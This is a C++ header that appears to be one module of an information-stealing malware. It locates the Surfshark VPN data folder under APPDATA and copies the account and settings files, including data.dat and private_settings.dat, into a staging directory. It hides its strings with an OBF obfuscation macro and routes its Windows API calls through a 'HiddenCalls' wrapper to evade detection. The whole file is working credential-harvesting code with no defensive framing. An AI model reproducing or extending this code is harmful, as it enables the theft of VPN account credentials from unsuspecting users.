#ifndef SURFSHARK_HPP
#define SURFSHARK_HPP

#include <string>
#include <filesystem>
#include "Winapi_structs.hpp"

namespace fs = std::filesystem;

namespace Surfshark {
    inline void Extract(const std::string& baseDir) {
        std::string surfsharkFolder = std::string(getenv(OBF("APPDATA"))) + "\\" + OBF("Surfshark");
        if (!fs::exists(surfsharkFolder)) {
            return;
        }

        std::string surfsharkAccount = baseDir + "\\" + OBF("Surfshark");
        HiddenCalls::CreateDirectoryA(surfsharkAccount.c_str(), NULL);

        std::vector<std::string> files = {
            OBF("data.dat"), OBF("settings.dat"), OBF("settings-log.dat"), OBF("private_settings.dat")
        };

        int copied = 0;
        for (const auto& file : files) {
            std::string srcPath = surfsharkFolder + "\\" + file;
            std::string dstPath = surfsharkAccount + "\\" + file;
            if (fs::exists(srcPath)) {
                HiddenCalls::CopyFileA(srcPath.c_str(), dstPath.c_str(), FALSE);
                copied++;
            }
        }

        if (copied == 0) {
            return;
        }
    }
}

#endif
